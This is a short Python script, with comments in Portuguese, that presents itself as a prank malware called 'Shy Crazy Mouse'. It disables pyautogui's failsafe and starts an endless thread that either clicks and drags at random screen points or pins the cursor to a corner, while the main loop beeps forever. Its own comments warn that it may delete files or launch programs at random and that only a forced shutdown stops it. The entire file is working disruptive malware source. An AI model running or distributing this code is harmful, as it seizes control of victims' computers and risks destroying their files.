import pyautogui
from threading import Thread
from random import randint

# Shy Crazy Mouse - Mistura de dois Malwares Irritantes, Crazy Mouse + Shy Mouse
#  - CrazyMouse: Clica, move e arrasta o mouse na tela.
#  - ShyMouse: Arrasta o mouse sempre em uma posicao escondida na tela, impossibilitando seu uso.
# CUIDADO: AO RODAR ESTE MALWARE, TODA ACAO SERA ALEATORIA, HA POSSIBILIDADE DE EXCLUSAO DE ARQUIVOS OU EXECUCAO DE PROGRAMAS ALEATORIOS, FORA QUE SERA PRATICAMENTE IMPOSSIVEL FECHAR DEPOIS DE ABERTO, SERA NECESSARIO FORCAR O DESLIGAMENTO OU REINICIALIZACAO DO SISTEMA PARA SEU USO FUNCIONAL.

global w,h
w,h=pyautogui.size()

# Ignorar erros
pyautogui.FAILSAFE=False

# Controles do mouse
class Controles:
    def clique(self,x,y):
        pyautogui.click(x,y)
    def cliqueDuplo(self,x,y):
        pyautogui.doubleClick(x,y)
    def cliqueTriplo(self,x,y):
        pyautogui.tripleClick(x,y)
    def cliqueOpcoes(self,x,y):
        pyautogui.rightClick(x,y)
    def move(self,x,y):
        pyautogui.moveTo(x,y)
    def arrasta(self,x,y):
        pyautogui.dragTo(x,y)

mouse=Controles()
def CrazyMouse():
    while 1:#for i in range(10): para testes...
        r=randint(0,5)
        x,y=randint(0,w),randint(0,h)
        if r==0:
            mouse.clique(x,y)
        elif r==1:
            mouse.cliqueDuplo(x,y)
        elif r==2:
            mouse.cliqueTriplo(x,y)
        elif r==3:
            mouse.cliqueOpcoes(x,y)
        elif r==4:
            mouse.move(x,y)
        elif r==5:
            mouse.arrasta(x,y)

def ShyMouse():
    while 1:
        mouse.move(w,h)

t=Thread(target=ShyMouse)if randint(0,1)else Thread(target=CrazyMouse)
t.setDaemon(True)
t.start()

#Pra thread principal nao morrer
while 1:
    input('\a')#bips(No Windows, no Termux isso pode forcar uma vibracao do celular)
